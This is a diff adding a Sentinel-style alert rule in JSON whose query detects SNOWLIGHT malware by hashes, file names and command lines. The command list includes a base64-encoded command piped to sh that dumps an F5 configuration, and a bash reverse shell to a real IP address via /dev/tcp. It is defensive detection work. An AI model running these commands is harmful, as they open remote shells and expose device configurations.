@@ -1,0 +1,98 @@
+﻿{
+    "id":  "/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/9214c15c-c700-4359-b1ed-8543547a2843",
+    "name":  "9214c15c-c700-4359-b1ed-8543547a2843",
+    "etag":  "\"87008eac-0000-2700-0000-66fdc6e70000\"",
+    "type":  "Microsoft.SecurityInsights/alertRules",
+    "kind":  "Scheduled",
+    "properties":  {
+                       "queryFrequency":  "P1D",
+                       "queryPeriod":  "P1D",
+                       "triggerOperator":  "GreaterThan",
+                       "triggerThreshold":  0,
+                       "severity":  "High",
+                       "query":  "// BAH_SNOWLIGHT\n// Author: Shawn McWhirter\n// Description: SNOWLIGHT uses raw sockets to connect to a hardcoded IP address over TCP port 443 and uses a binary protocol to communicate with the command and control server.\n// https://www.mandiant.com/resources/blog/initial-access-brokers-exploit-f5-screenconnect\n// False Positives: N/A\nlet ActionTypes = dynamic([\"FileCreated\", \"FileModified\"]);\nlet FileNames = dynamic([\"LG\", \"memfd:a\", \"undefined\"]);\nlet MD5s = dynamic([\"c867881c56698f938b4e8edafe76a09b\",\n                    \"df4603548b10211f0aa77d0e9a172438\",\n                    \"0951109dd1be0d84a33d52c135ba9c97\",\n                    \"9c3bf506dd19c08c0ed3af9c1708a770\",\n                    \"0ba435460fb7622344eec28063274b8a\",\n                    \"a78bf3d16349eba86719539ee8ef562d\"]);\nlet Cmds = dynamic([\"cmd_data=run util bash -c \\\"echo dG1zaCAtcSAtYyAnY2QgLztzaG93IHJ1bm5pbmctY29uZmlnIHJlY3Vyc2l2ZSc= | base64 -d | sh\\\"  \\\"tmsh -q -c \\\u0027cd /;show running-config recursive\\\u0027\\\"\",\n                    \u0027run util bash -c \"bash -i /dev/tcp/172.104.124.74/443 0\u003e\u00261 \u0026\"\u0027]);\nlet signInLookup = (\n    SigninLogs\n    | where TimeGenerated \u003e= ago(1d)\n    | where DeviceDetail contains \"displayName\"\n    | extend DeviceDetailJson = parse_json(DeviceDetail)\n    | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n    | distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\n(union isfuzzy=True\n  (\n  DeviceProcessEvents\n  | where InitiatingProcessCommandLine has_any (Cmds)\n  | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n  | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n  | project TimeGenerated, DeviceName, UserPrincipalName, FileName, FolderPath, MD5, InitiatingProcessCommandLine, Tactic = \"Possible SNOWLIGHT command usage\"\n  ),(\n  DeviceFileEvents\n  | where ActionType in (ActionTypes) and FileName in (FileNames) and MD5 in (MD5s)\n  | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n  | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n  | project TimeGenerated, DeviceName, UserPrincipalName, RequestAccountName, FileName, FolderPath, MD5, InitiatingProcessCommandLine, Tactic = \"Possible SNOWLIGHT files\"\n  )\n)\n",
+                       "suppressionDuration":  "PT5H",
+                       "suppressionEnabled":  false,
+                       "incidentConfiguration":  {
+                                                     "createIncident":  true,
+                                                     "groupingConfiguration":  {
+                                                                                   "enabled":  false,
+                                                                                   "reopenClosedIncident":  false,
+                                                                                   "lookbackDuration":  "PT5M",
+                                                                                   "matchingMethod":  "AllEntities",
+                                                                                   "groupByEntities":  [
+
+                                                                                                       ],
+                                                                                   "groupByAlertDetails":  null,
+                                                                                   "groupByCustomDetails":  null
+                                                                               }
+                                                 },
+                       "entityMappings":  [
+                                              {
+                                                  "entityType":  "Process",
+                                                  "fieldMappings":  [
+                                                                        {
+                                                                            "identifier":  "CommandLine",
+                                                                            "columnName":  "InitiatingProcessCommandLine"
+                                                                        }
+                                                                    ]
+                                              },
+                                              {
+                                                  "entityType":  "Host",
+                                                  "fieldMappings":  [
+                                                                        {
+                                                                            "identifier":  "HostName",
+                                                                            "columnName":  "DeviceName"
+                                                                        }
+                                                                    ]
+                                              },
+                                              {
+                                                  "entityType":  "File",
+                                                  "fieldMappings":  [
+                                                                        {
+                                                                            "identifier":  "Name",
+                                                                            "columnName":  "FolderPath"
+                                                                        },
+                                                                        {
+                                                                            "identifier":  "Directory",
+                                                                            "columnName":  "FileName"
+                                                                        }
+                                                                    ]
+                                              },
+                                              {
+                                                  "entityType":  "Account",
+                                                  "fieldMappings":  [
+                                                                        {
+                                                                            "identifier":  "Name",
+                                                                            "columnName":  "UserPrincipalName"
+                                                                        }
+                                                                    ]
+                                              },
+                                              {
+                                                  "entityType":  "FileHash",
+                                                  "fieldMappings":  [
+                                                                        {
+                                                                            "identifier":  "Value",
+                                                                            "columnName":  "MD5"
+                                                                        }
+                                                                    ]
+                                              }
+                                          ],
+                       "eventGroupingSettings":  {
+                                                     "aggregationKind":  "SingleAlert"
+                                                 },
+                       "tactics":  [
+                                       "Execution",
+                                       "CommandAndControl"
+                                   ],
+                       "techniques":  [
+                                          "T1059",
+                                          "T1572"
+                                      ],
+                       "displayName":  "BAH_SNOWLIGHT",
+                       "enabled":  true,
+                       "description":  "SNOWLIGHT uses raw sockets to connect to a hardcoded IP address over TCP port 443 and uses a binary protocol to communicate with the command and control server.\nPLATFORM:Microsoft 365,Azure AD,Windows,IaaS\nMITRE:TA0002;T1059,TA0011;T1572",
+                       "alertRuleTemplateName":  null,
+                       "lastModifiedUtc":  "2024-10-02T22:19:18.8962113Z"
+                   }
+}
